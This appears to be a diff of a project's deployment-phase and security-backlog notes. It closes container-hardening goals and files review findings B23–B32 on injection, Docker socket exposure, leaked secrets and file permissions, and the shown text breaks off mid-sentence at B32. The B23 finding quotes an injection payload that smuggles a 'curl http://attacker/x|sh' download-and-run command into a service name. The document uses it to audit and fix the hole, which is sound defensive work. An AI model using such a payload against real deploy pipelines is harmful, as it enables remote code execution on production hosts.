@@ -395,6 +395,22 @@ which were never inside the OpenBao migration boundary.
 
 ## Phase 7.5 — Minimus Container Images + Phase 7 Deploy Backlog (stub, 2026-08-09)
 
+**Outcome (T7.7, 2026-08-18, corrected 2026-08-18 — see note below):** G1–G6 fully shipped and
+E2E-verified on both staging and prod. G6.2's prod deny-all (T6.2.6/T6.2.7), the last piece flagged
+`[PROD-GATED]` at scoping time (2026-08-13 owner call), in fact closed 2026-08-16 in the same v2026.7
+prod window as G5's certbot verification — a since-deleted `Phase_7.5_Goal_Tree.md` scratch file was a
+stale 2026-08-13 snapshot and was wrongly read as current state in this section's first pass;
+`TASKS.md`'s own T6.2.6/T6.2.7/G6 rows are the correct source and are what this correction is based
+on. T7.6's two independent security review passes closed with no
+finding blocking the phase itself: Pass A (diff, Opus 5) filed 10 findings (2 HIGH/4 MEDIUM/4 LOW),
+2 fixed and 1 downgraded the same day; Pass B (end-state, Sonnet 5) filed 12 findings (3 HIGH/5
+MEDIUM/4 LOW), 2 resolved the same day. **The most serious open item from either pass, B23 (command
+injection into `remote_exec` via an unvalidated service name), was fixed the same day** —
+`haisir-deploy` branch `fix/b23-service-name-validation`, commit `4a6af82`, left unmerged for the
+owner to land. Every other still-open finding is filed as B24–B37 (`phases.md`
+Backlog section, added 2026-08-18); the closed Phase-7-era backlog (B1, B3, B4, B5) was cleared the
+same day.
+
 > **Planned 2026-08-09 via `/plan`** — goal tree in `PLAN.md`, checkboxes in `TASKS.md`, baselined
 > against backend `00c2c73`, frontend `705833d`, deploy `844e8f9`. **87 tasks** (deploy 66, specs 13,
 > backend 6, frontend 2) across seven goals; two challenger rounds run. The goals below are the
@@ -428,12 +444,12 @@ visible half of one problem.
 
 | Goal | Concern | Repos | Outcome |
 |---|---|---|---|
-| **G1** — Application images | `haisir-backend/Dockerfile` and `haisir-frontend/Dockerfile`: builder **and** runtime stages to `reg.mini.dev` at pinned tags. Removes the current split where the runtime is `cgr.dev/chainguard/{python,node}:latest` and the builder falls back to Docker Hub `python:3.14-slim` / node — a split that exists *only* because Chainguard's free tier has no pinned tag | backend, frontend | |
-| **G2** — Infrastructure images | Postgres+pgvector, APISIX runtime, Keycloak, etcd. **Deletes the from-source pgvector compile** in `postgres-docker/` — Minimus ships a maintained standalone Postgres+pgvector image. Extends hardening to APISIX/Keycloak/etcd, which are plain Docker Hub / quay.io today with none of the non-root/minimal-surface properties | deploy | |
-| **G3** — Monitoring unblocked | Prometheus + Grafana, deferred outright in `decisions.md` 2026-06-18 because Chainguard gated them behind a paid plan. Now free at pinned tags | deploy | |
-| **G4** — Pinning discipline proven | No `:latest` anywhere; `-dev` variants confined to build stages and never shipped; the three components with **no** Minimus equivalent (CrowdSec, HF text-embeddings-inference, dockhand) explicitly recorded as staying put (BR-INFRA-006), not silently missed | deploy | |
-| **G5** — Deploy backlog closed | B1, B3, B4, B5-residual — see the backlog section below. **B6 moves to G6**, which fixes it at the mechanism rather than the value | deploy, backend | |
-| **G6** — Env files under release control | The three deploy config files (`{env}/.env`, `{env}/.env.config.sh`, `common/.env.config.common.sh`) become version-controlled and ship with the release instead of being hand-copied to each host (**BR-SEC-022**). Host-topology values move to `secret/haisir/infra`; `ip-restriction` becomes deny-by-default (**BR-SEC-023**, **absorbs B6**); the ~130 lines of remote image-tag reconciliation in `deploy.sh` and the entire parallel manual deploy path are deleted | deploy, specs | |
+| **G1** — Application images | `haisir-backend/Dockerfile` and `haisir-frontend/Dockerfile`: builder **and** runtime stages to `reg.mini.dev` at pinned tags. Removes the current split where the runtime is `cgr.dev/chainguard/{python,node}:latest` and the builder falls back to Docker Hub `python:3.14-slim` / node — a split that exists *only* because Chainguard's free tier has no pinned tag | backend, frontend | ✓ **Closed 2026-08-13.** Both Dockerfiles fully on `reg.mini.dev`, python `3.14` / node `26`, non-root runtime users. Each image boots and healthchecks standalone; all three boot together healthy on staging (13/13, v2026.7). |
+| **G2** — Infrastructure images | Postgres+pgvector, APISIX runtime, Keycloak, etcd. **Deletes the from-source pgvector compile** in `postgres-docker/` — Minimus ships a maintained standalone Postgres+pgvector image. Extends hardening to APISIX/Keycloak/etcd, which are plain Docker Hub / quay.io today with none of the non-root/minimal-surface properties | deploy | ✓ **Closed 2026-08-14** (E2E passed 2026-08-12, box checked late). All five images on `reg.mini.dev`; `postgres-docker/` deleted; UID reconciliation (Postgres 70→999, backend datadir 65532→1000) landed clean on staging; every `image:` line resolves `reg.mini.dev`/`${DOCKER_REGISTRY}`, 0 violations. |
+| **G3** — Monitoring unblocked | Prometheus + Grafana, deferred outright in `decisions.md` 2026-06-18 because Chainguard gated them behind a paid plan. Now free at pinned tags | deploy | ✓ **Closed 2026-08-15 on staging, end to end.** All four scrape jobs `up` (T3.3's export-server fix live for the first time); `TargetDown` observed pending→firing on a stopped exporter; the alert reached Slack from inside the alertmanager container — the one untested dependency SMTP never had. |
+| **G4** — Pinning discipline proven | No `:latest` anywhere; `-dev` variants confined to build stages and never shipped; the three components with **no** Minimus equivalent (CrowdSec, HF text-embeddings-inference, dockhand) explicitly recorded as staying put (BR-INFRA-006), not silently missed | deploy | ✓ **Closed 2026-08-13, prod-side gap closed 2026-08-17 (T4.12).** `check-image-pins.sh` reports 0 violations; the only `:latest` left is the documented dev-only `pgadmin4` (BR-INFRA-005). No-unpinned-image property now holds on both staging and prod. |
+| **G5** — Deploy backlog closed | B1, B3, B4, B5-residual — see the backlog section below. **B6 moves to G6**, which fixes it at the mechanism rather than the value | deploy, backend | ✓ **Closed 2026-08-16, all three clauses, the last live on prod.** B1/B3/B4/B5 all fixed and cleared from the backlog (2026-08-18, T7.9). Certbot-hook assertion (T5.13) verified live on prod; the undocumented sudoers step it depended on is filed as **B15**. |
+| **G6** — Env files under release control | The three deploy config files (`{env}/.env`, `{env}/.env.config.sh`, `common/.env.config.common.sh`) become version-controlled and ship with the release instead of being hand-copied to each host (**BR-SEC-022**). Host-topology values move to `secret/haisir/infra`; `ip-restriction` becomes deny-by-default (**BR-SEC-023**, **absorbs B6**); the ~130 lines of remote image-tag reconciliation in `deploy.sh` and the entire parallel manual deploy path are deleted | deploy, specs | ✓ **Closed 2026-08-18, on both staging and prod.** BR-SEC-022 and BR-SEC-023 both marked shipped in `13_secrets_management.md` (T7.3). G6.2's prod deny-all (T6.2.6/T6.2.7) closed 2026-08-16 in the v2026.7 prod window — grant→login→revoke→403 proven live. G6.3–G6.6 (the seven-path commit, mode-600 delivery, version-reconciliation deletion, single deploy path) all closed 2026-08-17/18, staging-verified across two deploys. |
 
 ### G6 — Env files under release control
 
@@ -564,9 +580,24 @@ It does not depend on G1–G4 and should not wait behind them.
 > Recorded here rather than retrofitted into a closed phase, so the phase record stays honest about
 > what it actually covered.
 >
-> **B1, B3, B4 and B5-residual are claimed by Phase 7.5 G5** (above). **B6 is claimed by G6.2**
-> (**BR-SEC-023**), which fixes the fail-open mechanism in `template-configs.sh` rather than setting
-> a CIDR value — see the root-cause trace under G6. **B2 stays in the backlog** — it is not deploy-blocking.
+> **B1, B3, B4 and B5 were claimed by Phase 7.5 G5** (above) and are **CLEARED 2026-08-18 (T7.9)** —
+> all four closed and fixed (B1: T5.1/T5.2 poller rollback + T5.3/T5.12 live-verified 0 idle-in-transaction;
+> B3: T5.5 brought `other/cert/` into the deploy sync, T5.6/T5.7/T5.13 assert the installed hook
+> matches; B4: T5.4 surfaces the real stderr instead of one generic message; B5: closed live on prod
+> 2026-08-16, T5.8 pinned the rootlesskit port-driver across all three hosts). Their full entries are
+> retired from this section — see `TASKS.md` T5.1–T5.13 and G5's E2E close for the evidence trail.
+> **B6 is claimed by G6.2** (**BR-SEC-023**), which fixes the fail-open mechanism in
+> `template-configs.sh` rather than setting a CIDR value — see the root-cause trace under G6, closed
+> 2026-08-16 on prod. **B2 stays in the backlog** — it is not deploy-blocking, and recurs on every
+> release that moves a Postgres base image.
+>
+> **B23–B39 added 2026-08-18 (T7.9)**, filing the still-open findings from T7.6's two independent
+> Phase 7.5 security review passes (`security/SECURITY_REVIEW_2026-08-18_PHASE7.5_pass-a-diff.md`,
+> `security/SECURITY_REVIEW_2026-08-18_PHASE7.5_pass-b-endstate.md`). Findings already fixed or
+> resolved the same day (Pass A F1/F2, Pass B F3/F5) are not filed — see each review's own
+> "Post-review resolutions" table. **B23 (Pass B F1, command injection into `remote_exec` via an
+> unvalidated service name) is the most serious open item either pass produced** — untouched as of
+> this phase's close.
 >
 > Worth naming as a pattern rather than five separate tickets: **B4, B5 and B6 all fail open.**
 > B4 collapses every failure cause into one generic message by swallowing stderr; B5 assumed a host
@@ -581,31 +612,6 @@ It does not depend on G1–G4 and should not wait behind them.
 > one with a security consequence** (the only tool for recovering Keycloak admin access cannot grant
 > an IPv6 client), and **B14/B15 are what cost three failed deploy attempts** — both are
 > report-success-while-failing bugs, the same fail-open pattern this list keeps naming.
-
-### B1 — Worker poller sessions sit `idle in transaction` (backend) — **the one worth fixing properly**
-
-**Observed:** on staging, the `extraction_jobs` and `essay_grading_jobs` poller sessions had held
-open transactions for **2h27m**. Confirmed identically on prod (2 sessions). Both loops use
-`FOR UPDATE SKIP LOCKED` and appear to leave the session open between polls rather than committing
-or rolling back.
-
-**Why this matters beyond tidiness — two distinct consequences:**
-
-1. **It blocks DDL, and does so in the worst way.** A `REINDEX`/`ALTER TABLE` needing
-   `ACCESS EXCLUSIVE` queues behind the idle transaction — and once that request is queued, **every
-   subsequent reader queues behind it too**. So the failure mode is not "migration fails fast", it is
-   "the whole app stalls." This was not theoretical: it is exactly how the first staging reindex
-   attempt behaved, and it had to be cancelled. **A future `alembic upgrade head` during a deploy can
-   stall the application the same way** — see the prod deploy caution in B2.
-2. **It holds back the xmin horizon**, so autovacuum cannot reclaim dead tuples anywhere in the
-   database for as long as the oldest transaction stays open.
-
-**Fix direction:** commit or roll back between poll iterations so the session returns to `idle`, not
-`idle in transaction`. A `statement_timeout`/`idle_in_transaction_session_timeout` on the worker role
-is a defence-in-depth backstop, not the fix. Restarting the worker only resets the clock.
-
-**Do not fix blind** — the loops are `FOR UPDATE SKIP LOCKED` claim-and-process, so transaction
-boundaries carry the claim semantics. Changing them needs its own tests.
 
 ### B2 — Postgres collation version mismatch (ops) — **RECURRING, not one-time. Reopened 2026-08-15**
 
@@ -688,100 +694,11 @@ indexes in each environment.
 silences the warning while leaving every index built under the old collation — it removes the signal
 and keeps the risk, which is strictly worse than doing nothing.
 
-**Caution for the prod v2026.6 deploy:** the deploy runs `alembic upgrade head`. With B1 unfixed and
-prod currently showing 2 idle-in-transaction sessions, a migration needing an exclusive lock can
-stall behind them and take the app with it. Stop `haisir-worker-prod` before the deploy, or confirm
-`SELECT count(*) FROM pg_stat_activity WHERE state='idle in transaction'` is 0 first.
-
-### B3 — `other/` is outside the deploy rsync path, so hook fixes never reach the hosts (ops)
-
-`common/deploy-remote-common.sh` (sync step) rsyncs **only** `common/` and `${ENV}/`. Anything under
-`other/` — including `other/cert/haisir-sync-certs.sh`, installed as the certbot renewal hook — is
-hand-placed on each host and never updated by a deploy.
-
-**Found 2026-08-07, prod.** The T1.3.3 OpenBao fallback (`3abeda3`, 2026-07-16) had been in the repo
-for three weeks and had never reached prod. The installed hook was an older revision still, older
-than both HEAD and the March version. Effect: every certbot deploy hook since ~2026-07-16 aborted at
-its `APISIX_ADMIN_KEY` guard, before the cert copy — so certbot kept renewing correctly while
-**nothing distributed the result**. Discovered incidentally: `/etc/letsencrypt/live/haisir.in` held a
-cert valid to **Oct 14 2026** while APISIX was still serving one expiring **Aug 15 2026**, 8 days out.
-Invisible from outside because cftunnel terminates public TLS at Cloudflare's edge cert.
-
-Two candidate fixes — the second is the one that actually closes it:
-
-1. Extend the sync to cover `other/cert/`. Cheap, but only fixes files that happen to live under a
-   synced path; the installed copy at `/etc/letsencrypt/renewal-hooks/deploy/` is still a *copy*.
-2. Have the deploy assert the installed hook matches the repo (hash compare, fail loud). Catches
-   drift regardless of how the file got there.
-
-> The failure is silent by construction: a broken renewal hook produces no alert, and the only
-> symptom is a cert quietly approaching expiry behind an edge terminator that hides it.
-
-### B4 — T1.3.3's OpenBao render was never exercised as root (ops / deploy)
-
-`other/cert/haisir-sync-certs.sh` requires root (it reads `/etc/letsencrypt`), but T1.3.3 made it call
-`render_deploy_secrets_or_die` → `render-deploy-secrets.sh` → `docker exec openbao-prod`. staging and
-prod run **rootless** Docker under `sss` (`common/openbao/bootstrap.sh` notes this), so root sees a
-different, empty daemon and has no `docker` binary on `PATH`. The render therefore fails in the one
-context the hook actually runs in, while working fine under `deploy.sh` — which runs as `sss`.
-
-Fixed 2026-08-07 in `561e631`: when `EUID -eq 0`, point `DOCKER_HOST` at
-`/run/user/$(id -u sss)/docker.sock` and prepend `/home/sss/bin` to `PATH`, rather than dropping
-privileges (which would lose the `/etc/letsencrypt` access the rest of the script needs).
-
-**The wider item, unfixed:** `bao_deploy_token()` in `common/openbao/render-deploy-secrets.sh`
-redirects stderr to `/dev/null`, so *every* failure mode — container down, sealed vault, missing cert,
-unregistered role, `docker: command not found`, wrong socket — collapses into one generic message
-listing four causes, none of which was the actual one here. Surfacing the underlying stderr on failure
-would have made this a one-minute diagnosis instead of a multi-step bisection.
-
-> Related dependency worth noting: the rootless socket only exists while `sss` has a live systemd user
-> session. If linger is ever disabled, the hook breaks again at the next unattended renewal.
-
-### B5 — `allow_admin` assumes the wrong host address under rootless Docker (deploy)
-
-**Broke the v2026.6 prod deploy 2026-08-08.** `common/apisix_conf/config.yaml`'s `allow_admin` carries
-`10.0.2.0/24` commented *"rootless Docker slirp4netns (host appears as 10.0.2.2)"*. On prod the host
-does not appear as `10.0.2.2` — a host-originated call to a published port arrives as the **bridge
-gateway, `172.19.0.1`**. That address used to be covered by the `172.19.0.0/16` entry **T7.7.1
-removed**, and nothing noticed because `setup.sh` still reached the Admin API over the Tailscale IP,
-which its own `/32` allowed. T7.7.2 then moved the binding to loopback — and the two changes, each
-correct alone, left no entry matching the caller.
-
-Result: Step 8's `setup.sh` could not reach the Admin API, so **routes, plugin configs and global
-rules were never pushed**. Backend, frontend and gateway were all healthy on v2026.6 and login worked,
-because APISIX kept serving the previous route table — while `26-images-questions`, new in this
-release, was absent and V43 had already rewritten every `questions.image_url` to a path only that
-route can serve. A deploy that reports failure at the last step but leaves a *working-looking* site.
-
-Fixed live by setting `APISIX_ADMIN_ALLOWED_CIDR="172.19.0.1/32"` in `prod/.env.config.sh` — the
-bridge gateway only, deliberately **not** the `/16`, so T7.7.1's reason for removing it (any container
-on haisir-net that learned the admin key could rewrite every route) still holds: containers get
-`172.19.0.x`, `.1` is the bridge itself. `.env.config.sh` is gitignored and lives on the host, so the
-fix survives future deploys.
-
-**Why staging was unaffected — answered 2026-08-08, and it is not reassuring.** Staging's `allow_admin`
-is *identical* (`10.0.2.0/24`, own Tailscale `/32`, workstation `/32`), `APISIX_ADMIN*` is absent from
-its `.env` too, and its bridge gateway is also `172.19.0.1`. Same config, same subnet, opposite result:
-staging's Admin API answers **401** to a host-originated call (IP accepted) where prod answered 403.
-The difference is the **rootlesskit port driver** — neither host sets `--port-driver` explicitly, so
-each follows its own rootlesskit version, and the two rewrite the source address differently
-(`slirp4netns` → `10.0.2.2`, `builtin` → the bridge gateway). Staging is therefore not correct by
-design; it is correct by accident, and a rootlesskit upgrade there reproduces prod's failure exactly.
-
-**Fixed at the template 2026-08-08:** `allow_admin` now carries **both** `10.0.2.0/24` and
-`172.19.0.1/32`, so either port driver resolves. Prod's `APISIX_ADMIN_ALLOWED_CIDR="172.19.0.1/32"`
-override becomes redundant on its next deploy but is harmless. Residual worth naming: this is
-**environment drift at the container-runtime layer**, invisible to every config diff, and an IP
-allowlist was simply the first thing to depend on it. Pinning the rootless Docker/rootlesskit version
-across hosts is the real remedy and is not done.
-
-> ✅ **CLOSED 2026-08-16 — confirmed fixed live on prod, the first real test of the template fix.**
-> The v2026.7 prod deploy's `setup.sh` reached the Admin API and pushed **27 routes, 4 plugin configs
-> and the global rules with 0 failures**. The v2026.6 silent-no-push did not recur. The residual this
-> entry named — pinning the runtime layer — was also closed inside Phase 7.5 by T5.8: both hosts now
-> report Docker 29.7.1 / rootlesskit 3.0.2 with `--port-driver=slirp4netns` pinned in a systemd
-> drop-in, verified in the live process argv (G5 clause 3).
+**Caution, superseded:** this note originally warned that `alembic upgrade head` could stall behind
+the idle-in-transaction sessions the since-closed B1 described. B1 is fixed (T5.1/T5.2, live-verified
+0 idle-in-transaction on staging and prod by T5.12) — kept here only as the reason every migrating
+deploy still stops the worker first, now a standing constraint rather than a live risk (see
+`constraints.md`, "the worker must be stopped before any migrating deploy").
 
 ### B6 — Keycloak admin routes run with no IP allowlist (security, pre-existing)
 
@@ -976,6 +893,13 @@ phrase for the too-broad-to-preserve branch.
 not a deny-all; it renders whatever that key holds in KV. On staging it renders `<staging-admin-cidr>` —
 a live `/32` grant. So the documented safe fallback actually *installs standing access*.
 
+> **Second instance found 2026-08-18, T7.6 Pass A F4.** The *read* half of the same script has an
+> independent fail-open bug: `curl` without `--fail` exits 0 on a 401/403, so a wrong or rotated
+> `APISIX_ADMIN_KEY` reads as "nothing live to preserve" and silently republishes the template's
+> whitelist — the explicit `log_warn` the author wrote for this case is only reachable on a
+> *transport* failure, never an auth one. Fix (from the review): switch to `-w '%{http_code}'` and
+> branch on 2xx / 404 / anything else, logging the anything-else case instead of going quiet.
+
 Staging blast radius is nil: that address is Tailscale-only and unreachable from the internet. **Prod
 is the concern** — it is public-fronted through cftunnel, so if prod's KV value is a routable
 address, a transport blip during Step 8 would silently publish a standing public grant to the
@@ -1053,6 +977,13 @@ The no-arg form is wrong by construction on any host, not just prod.
 of the caller's public IP via api.ipify.org is CORRECT". It is not. Fix the script (drop the
 auto-detect, or make it fail loudly when `$PWD` is a deploy environment directory) and fix the
 manifest text.
+
+> **Re-confirmed 2026-08-18, T7.6 Pass A F5, with a sharper worst case.** Under a shared cloud NAT
+> gateway, the host's egress `/32` is shared with every other workload behind the same address — so
+> the bare-`grant` bug does not just grant the wrong single caller, it can open the Keycloak admin
+> console to unrelated tenants behind the same NAT, permanently (`keycloak-admin-access.sh` grants
+> never expire). `MIN_GRANT_PREFIX=24` does not help — a `/32` of a shared address is still a `/32`.
+> Fix proposed by the review: make the CIDR argument required, delete the auto-detect path outright.
 
 ### B14 — `deploy.sh` Step 3 reports success while writing nothing (deploy)
 
@@ -1366,3 +1297,247 @@ by construction and aborts the deploy if it cannot verify that, so a manifest-si
 a property the same code path just enforced, using the same query and the same credential — it would
 fail only when the prune had already failed loudly. Worth adding if the assertion ever needs to come
 from something other than the pusher. Recorded here rather than left as an unexplained omission.
+
+### B23 — Command injection: unvalidated service names reach a remote shell via `deploy.sh`'s `remote_exec()` (deploy / security) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F1 — the most serious open finding either review pass produced, and
+untouched as of this phase's close.** `common/scripts/deploy-lib.sh:91-103` (`remote_exec()`) pipes a
+built command string to `bash -s` on the remote host over SSH — a second shell parse, so any shell
+metacharacter in the value is live syntax there. `${cmd}` is assembled from a `SERVICES` array taken
+verbatim from two unvalidated sources: `deploy.sh:177` (the release manifest's `services:` map keys)
+and `deploy.sh:149-150` (the raw `--services` CLI flag). A service name containing a semicolon, pipe,
+or backtick — e.g. `` frontend`curl http://attacker/x|sh` `` — executes as the deploy SSH user on the
+real staging or prod host.
+
+The more directly reachable entry point is `Jenkinsfile.deploy`'s free-text `SERVICES` build
+parameter (`:170-178` staging, `:267-273` prod) — no regex validation, unlike `VERSION`. It does
+**not** grant code execution on the Jenkins agent itself (`sh '''...'''` is a non-interpolating Groovy
+string; verified empirically), but a value reaching `deploy.sh --services <value>` lands in the exact
+same unvalidated `remote_exec` sink — no manifest commit required, just permission to trigger the
+parameterized build.
+
+**Fix:** validate every parsed service name — from both `--services` and the manifest — against the
+fixed set of compose service names (or `^[a-z][a-z0-9_-]*$`) immediately after parsing; quote
+`"${SERVICES[@]}"` throughout instead of building space-joined strings for `remote_exec`. Add the same
+regex validation `Jenkinsfile.deploy` already applies to `VERSION` to the `SERVICES` parameter. Also
+check `Jenkinsfile.integration-dast`, not read by Pass B, for the same free-text-parameter shape.
+
+✅ **FIXED 2026-08-18**, `haisir-deploy` branch `fix/b23-service-name-validation` (commit `4a6af82`,
+not yet merged to `main` — owner is handling the merge). `deploy.sh` validates every entry in
+`SERVICES` against `^[a-z][a-z0-9_-]*$` immediately after the array is built (the single choke point
+both the manifest and `--services` funnel through), before anything reaches `remote_exec`; refuses
+with a named error naming the offending value on a violation. `Jenkinsfile.deploy`'s Validate stage
+gained the same regex check on the `SERVICES` parameter, mirroring the existing `VERSION` check, as
+defense in depth. Offline regression `common/scripts/tests/service-name-validation-check.sh` (new)
+asserts semicolon/backtick/pipe injection is rejected via both entry points and that ordinary valid
+names are not caught in the crossfire; wired into the Jenkinsfile's Static Security Checks stage.
+`Jenkinsfile.integration-dast`'s same-shape risk (flagged above, not read by either T7.6 pass) is not
+addressed by this fix — still worth checking separately.
+
+### B24 — Jenkins mounts the rootless Docker socket read-write, giving any build full host container control (deploy / security) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F2.** `other/services/jenkins/docker-compose.yml:24` mounts
+`/run/user/1000/docker.sock:/var/run/docker.sock` with no `:ro` — and per **B29** below, `:ro` would
+not have been a real restriction regardless. Every pipeline stage on every build (not just the B23
+`SERVICES` path — the ordinary backend/frontend `npm install`/`pip install` build is its own
+supply-chain surface) runs with this socket available, equivalent to root over every container and
+volume the host's Docker daemon manages. A build that pivots through the socket can read `jenkins_home`
+directly, where the `staging-ssh-key`/`prod-ssh-key` credentials `Jenkinsfile.deploy`'s later stages
+load are cached.
+
+**Fix:** front the socket with a scoped proxy (`tecnativa/docker-socket-proxy`, limited to the
+build/push/pull verbs Jenkins actually needs) or move to build isolation that doesn't need host Docker
+access (kaniko / buildah-in-userns / sysbox).
+
+### B25 — Monitoring-profile exporter variables have no delivery mechanism this phase left standing (deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass A F3** (filed HIGH as a possible plaintext-credential-in-git, downgraded
+MEDIUM same day once the owner confirmed `POSTGRES_EXPORTER_DSN` is in no committed file — see T7.6's
+post-review table). `common/docker-compose.yml:874`/`:908` reference `POSTGRES_EXPORTER_DSN` and
+`NGINX_EXPORTER_SCRAPE_URI`. Neither is in OpenBao, neither is in any of the seven committed `.env*`
+paths, and `common/docker-compose.yml` carries exactly one `${VAR:?}` guard in the whole file (not
+either of these) — so starting the `monitoring` profile today interpolates both to empty: an empty DSN
+and an empty scrape URI, and Prometheus reports two targets down with nothing naming why. Not currently
+exploitable — the profile has never been activated on staging or prod, and `deploy.sh` does not
+activate it — but it is a gate to close *before* it first ships, reproducing the phase's own recurring
+defect shape (B14/B20/B22: absent value and broken value producing the same silent answer).
+
+**Fix, and the decision it forces:** `NGINX_EXPORTER_SCRAPE_URI` is not a credential — give it a
+`${VAR:?...}` guard or drop the service until a real scrape target exists. `POSTGRES_EXPORTER_DSN` is
+a credential and needs an owner call: `GRAFANA_ADMIN_PASSWORD` got a KV path + vault-agent sidecar +
+`$__file{}` delivery (B... — see the G6 spec's B8 precedent) so it never becomes an env var, but
+postgres_exporter 0.20.1 has no file-based DSN option at all. Nearest equivalent: a dedicated
+`secret/haisir/monitoring` KV path plus a `deploy-required-keys.txt` entry (`envs=staging,prod`).
+
+### B26 — Cloudflare tunnel token delivered via container `environment:` and CLI arg, contradicting the project's own file-based delivery pattern (deploy / security) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F4.** `other/services/cftunnel/docker-compose.yml` interpolates
+`${TUNNEL_TOKEN}` into both `command: tunnel ... --token ${TUNNEL_TOKEN}` and `environment:`. `up.sh`
+correctly renders the token from OpenBao KV at deploy time (fail-closed if unseeded), but the resolved
+value still lands in the container's actual environment and in process argv — visible via
+`docker inspect` and host `ps`/`/proc/<pid>/cmdline`. Every other Class A/B secret in this stack is
+delivered as a file specifically to avoid this; cftunnel is the one exception.
+
+**Fix:** drop the `--token` CLI argument — `cloudflared tunnel run` reads `TUNNEL_TOKEN` from its
+environment natively. The `environment:`/`docker inspect` exposure would remain; closing that fully
+needs a cloudflared flag/mechanism that reads the token from a mounted file (not confirmed available
+in the pinned version) — flag for follow-up, or accept the narrower residual explicitly.
+
+### B27 — Rendered `alertmanager.yml` is mode 600 on the host but bind-mounted into a container that likely can't read it (deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass A F6.** `template-configs.sh:279-303` correctly `chmod 600`s the
+rendered `alertmanager.yml` (it holds `ALERT_SLACK_WEBHOOK` in cleartext). `common/docker-compose.yml`
+bind-mounts that path into the `alertmanager` service, which declares no `user:` and runs as its
+image's default uid — under rootless Docker that uid does not map to the deploy user, so the mount is
+expected to fail to read and Alertmanager would crash-loop on config load. Same shape as the OpenBao
+`user: "100:1000"` fix and the `db-init`/`keycloak-db-init` volume-ownership gap Step 5d closed. Not
+confirmed live — the `monitoring` profile has never been started on staging or prod.
+
+**Fix:** decide deliberately between loosening to 640 with a matching gid, or pinning `user:` on the
+alertmanager service to match the render's owner. **Do not fix by `chmod 644`** — the file contains
+the webhook.
+
+### B28 — OpenBao root-token revocation is a log warning only, never checked (deploy / security) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F6.** `common/openbao/bootstrap.sh:246` prints a `log_warn` telling the
+operator to revoke/rotate the root token once OIDC admin login works — that warning is the entire
+enforcement mechanism for BR-SEC-013. No code path revokes it and nothing checks that it *was* revoked
+before a later deploy or bootstrap step proceeds. The token sits in `.bootstrap-out/<env>/server-init.json`
+(mode 600, gitignored — confirmed) until a human remembers.
+
+**Fix:** add a `bootstrap.sh verify` subcommand that checks the root token is dead
+(`bao token lookup` against it fails) and have deploy readiness / CI treat a live root token past the
+OIDC-cutover point as a failing check, not a warning.
+
+### B29 — `docker.sock:ro` mounts don't restrict the Docker API, and dockhand's admin UI ships auth as an opt-in checklist item (deploy / security) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F7.** `other/services/crowdsec/docker-compose.yml` and
+`other/services/dockhand/docker-compose.yml` both mount the socket `:ro`. The flag restricts
+filesystem-level operations on the socket file — it does not restrict what a client connected to it
+can ask the Docker Engine API to do; the daemon still accepts the full read-write API regardless of
+the mount's write bit. CrowdSec parses externally-influenceable log data, so a parser bug there plus
+this socket access is a path to full host container control. Dockhand is the more direct case: a full
+Docker management UI (start/stop/exec/terminal/file-browser on any container), and its own `README.md`
+lists "Enable authentication (Settings → Auth)" as a post-deploy checklist item, not default-on — a
+window exists between `docker compose up -d` and that step where the UI may be reachable unauthenticated.
+**Mitigating, confirmed:** the Tailscale ACL restricts dockhand's port to `src: tag:dev1` only, real
+defense-in-depth, not the whole tailnet.
+
+**Fix:** front both socket uses with a scoped read-only API proxy (`tecnativa/docker-socket-proxy`,
+`CONTAINERS=1`/`INFO=1` only for CrowdSec); script dockhand's auth-enablement into first bring-up
+rather than leaving it as a manual step, and correct the README's "reduces attack surface" claim.
+
+### B30 — 27 pre-OpenBao-migration secrets remain in git history; rotation status unconfirmed (security) — surfaced 2026-08-18, DEFERRED by owner call
+
+**Found 2026-08-18, T7.6 Pass B F8.** `gitleaks git` over the full history (341/344 commits) found 27
+findings, all dated 2025-09-20 through 2026-02-19 (before the OpenBao secrets migration closed
+2026-07-21), under a top-level `apisix/` path layout no longer in the current tree: real
+`keycloak-admin-password`, `generic-api-key`/`generic-secret-in-config`, and `oidc-client-secret`
+values. Git history is permanent and reachable by anyone who can `git clone`, independent of current
+file contents (a working-tree-only scan comes back clean). **Whether these specific values were
+rotated as part of the Phase 5.6 OpenBao cutover could not be determined without reading `.env*`/KV
+directly** — out of scope for a read-only audit.
+
+**Owner call, 2026-08-18 (same day as T7.6):** deferred, not rotated now, to avoid breaking
+staging/prod outside a release window. **The exposure is unchanged by the deferral** — anyone with
+repo history access holds those values — so this is an accepted risk to reconsider at the next
+release, not a closed finding. **Action:** confirm with the operator whether `APISIX_ADMIN_KEY`,
+`KEYCLOAK_ADMIN_PASSWORD`, and the OIDC `client_secret` from these specific commits were rotated after
+2026-02-19; rotate via `common/openbao/rotate-secret.sh` if any were carried forward unrotated.
+Separately consider `git filter-repo` — lower priority than confirming rotation.
+
+### B31 — APISIX's Prometheus export server moved from container-loopback to `0.0.0.0` with no auth and no network segmentation (deploy) — surfaced 2026-08-18, accepted
+
+**Found 2026-08-18, T7.6 Pass A F7.** `common/apisix_conf/config.yaml:140` (and `dev/apisix_conf/config.yaml:56`)
+changed `plugin_attr.prometheus.export_addr.ip` `127.0.0.1` → `0.0.0.0` — correctly fixing T3.3's real
+defect (the scrape target could never connect, so `TargetDown` fired permanently). The host publish is
+still narrowed to `127.0.0.1:9091:9091`. What's unaddressed: `haisir-net` is one flat network shared by
+every service in the stack, and the metrics endpoint has no authentication — any compromised container
+on that network can now read APISIX's full route inventory, upstream names, and per-route request/status
+counts. Reconnaissance value, not credentials. Every alternative (dedicated monitoring network, mTLS
+scrape) is real work.
+
+**Disposition:** accept explicitly as a documented, informational residual of a correct bug fix — not
+a fix to schedule unless the network topology changes for other reasons.
+
+### B32 — APISIX's rendered `config.yaml` is written into the shared config volume as mode 666 (deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass A F8.** `common/scripts/deploy.sh:865` (Step 8) does
+`chmod 666 /conf/config.yaml` after copying the rendered APISIX config into the volume — the file
+carries the resolved `APISIX_ADMIN_KEY` and the `allow_admin` CIDR list. Mode 666 makes it
+world-readable **and world-writable** inside the volume; anything that can mount
